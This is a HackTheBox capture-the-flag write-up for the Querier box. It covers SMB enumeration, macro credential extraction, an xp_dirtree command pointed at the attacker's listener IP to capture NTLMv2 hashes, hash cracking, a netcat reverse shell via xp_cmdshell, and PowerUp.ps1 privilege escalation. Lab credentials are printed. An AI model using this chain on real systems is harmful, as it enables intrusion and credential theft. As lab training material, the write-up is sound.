# Querier -- HackTheBox (write-up)

**Difficulty:** Medium
**Box:** Querier (HackTheBox)
**Author:** dsec
**Date:** 2024-05-26

---

## TL;DR

### Found MSSQL creds in an Excel macro via olevba, used xp_dirtree to capture an NTLMv2 hash, cracked it, then used PowerUp.ps1 to find admin credentials for a full compromise.

---

## Target info

- Services discovered: `135/tcp`, `139/tcp`, `445/tcp (smb)`, `1433/tcp (mssql)`

---

## Enumeration

![Nmap results](images/querier-htb_1.png)

![SMB enumeration](images/querier-htb_2.png)

![SMB shares](images/querier-htb_3.png)

![Excel file found](images/querier-htb_4.png)

Extracted macro from `.xlsm` file with olevba, found creds:

![olevba output](images/querier-htb_5.png)

- `reporting:PcwTWTHRwryjc$c6`

---

## Exploitation

![MSSQL login](images/querier-htb_6.png)

![xp_cmdshell](images/querier-htb_7.png)

Used `xp_dirtree` to force NTLM authentication back to my listener:

```sql
EXEC xp_dirtree '\\10.10.14.169\test', 1, 1
```

![Hash captured](images/querier-htb_8.png)

Captured NTLMv2 hash for `mssql-svc`. Cracked with hashcat:

![Hashcat result](images/querier-htb_9.png)

- `corporate568`

Logged back into MSSQL with the new creds and enabled `xp_cmdshell`:

![New MSSQL session](images/querier-htb_10.png)

![Command execution](images/querier-htb_11.png)

Used `nc64.exe` to get a shell:

![Reverse shell](images/querier-htb_12.png)

- Potato attack **failed**.

---

## Privilege escalation

Ran `PowerUp.ps1`:

![PowerUp results](images/querier-htb_13.png)

- Found: `Administrator:MyUnclesAreMarioAndLuigi!!1!`

Connected via evil-winrm:

![Root flag](images/querier-htb_14.png)

---

## Lessons & takeaways

- `nxc smb` showed nothing for a null session, but `smbclient` did -- always try both
- Use `olevba` to extract macro info from Excel workbooks (`.xlsm`)
- `xp_dirtree` is great for capturing NTLMv2 hashes when you have MSSQL access
- `PowerUp.ps1` can reveal stored credentials and misconfigurations
